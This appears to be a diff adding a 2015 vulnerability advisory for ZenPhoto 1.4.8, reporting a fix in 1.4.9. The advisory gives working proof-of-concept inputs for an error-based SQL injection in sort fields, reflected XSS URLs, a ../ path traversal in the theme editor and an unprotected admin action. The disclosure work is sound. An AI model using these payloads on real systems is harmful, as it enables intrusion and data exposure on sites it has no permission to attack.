@@ -1,0 +1,70 @@
+Vulnerability: SQL Injection, Reflected XSS, Path Traversal
+Affected Software: ZenPhoto (http://www.zenphoto.org/)
+Affected Version: 1.4.8 (probably also prior versions)
+Patched Version: 1.4.9
+Risk: Medium
+Vendor Contacted: 2015-05-18
+Vendor Fix: 2015-07-09
+Public Disclosure: 2015-07-10
+
+SQL Injection
+=============
+
+  There are multiple second order error based SQL injections into the
+ORDER BY keyword in the admin area.
+
+   - visit zp-core/admin-options.php?saved&tab=gallery
+     alternatively visit zp-core/admin-options.php?saved&tab=image
+   - Set "Sort gallery by" to "Custom"
+   - set custom fields to "id,extractvalue(0x0a,concat(0x0a,(select
+version())))%23"
+   - visit zp-core/admin-upload.php?page=upload&tab=http&type=images
+   - alternatively, visiting either of these will also trigger the injection:
+    /
+    zp-core/admin-edit.php
+    zp-core/admin-users.php?page=users
+    zp-core/admin-themes.php
+
+  The result is only directly displayed if the server is configured to
+report errors, but it can also be seen in the logfile located at
+zp-core/admin-logs.php?page=logs
+
+XSS 1
+=====
+
+  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?error=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
+  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/utilities/backup_restore.php?compression=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
+
+    The payload must first be HTML entity-encoded, and then URL encoded.
+
+XSS 2
+=====
+
+
+http://localhost/zenphoto-security-fixes/zp-core/admin.php?action=external&error="
+onmouseover="alert('xsstest')" foo="bar&msg=hover over me!
+
+Directory Traversal
+===================
+
+  For an admin, it is possible to view and edit any PHP or inc files, not
+just the ones inside the theme directory.
+
+  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/admin-themes-editor.php?theme=../../../../../var/www&file=secret.php
+
+
+Execute Function
+================
+
+An admin user can execute any function they want via this URL (there is
+no CSRF protection for it):
+
+    localhost/zenphoto-security-fixes/zp-core/admin.php?action=phpinfo
+
+This gives up some control over the control flow of the site, which
+might cause problems, especially considering the missing of CSRF protection.
+
+Source
+======
+
+http://software-talk.org/blog/2015/07/second-order-sql-injection-reflected-xss-path-traversal-function-execution-vulnerability-zenphoto/
